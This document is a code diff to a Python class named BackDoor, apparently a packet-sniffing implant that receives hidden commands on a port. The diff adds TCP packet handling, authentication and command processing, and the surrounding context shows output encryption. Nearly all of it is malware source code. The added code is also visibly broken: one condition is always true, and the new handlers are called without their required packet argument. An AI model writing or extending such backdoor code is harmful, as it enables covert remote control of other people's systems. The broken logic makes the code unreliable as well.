@@ -345,6 +345,14 @@ class BackDoor:
         self.craft_packet(msg)
 
     def filter_packets(self, packet) -> None:
+        if self.proto == "tcp":
+            self.process_tcp()
+        elif self.proto == "udp" or "dns":
+            self.process_udp()
+        else:
+            return
+
+    def process_udp(self, packet: Packet):
         try:
             msg = packet[UDP].load.decode()
             if UDP in packet and packet[UDP].dport == self.recv_port:
@@ -353,6 +361,17 @@ class BackDoor:
                     self.process_packet(val)
         except:
             return
+
+    def process_tcp(self, packet: Packet):
+        try:
+            if TCP in packet and Raw in packet and packet[TCP].dport == self.recv_port:
+                raw_data = packet[Raw].load
+                val = self.authenticate_packet(raw_data, packet)
+                if val:
+                    self.process_packet(val)
+        except:
+            return
+
 
     def process_packet(self, data):
         stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
@@ -385,9 +404,6 @@ class BackDoor:
         padded_line = padder.update(line.encode()) + padder.finalize()
         encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
         return encrypted_line
-
-    def set_hex(self):
-        self.hex_data = ""
 
     def generate_cipher(self) -> Cipher:
         """Generates cipher for encryption"""
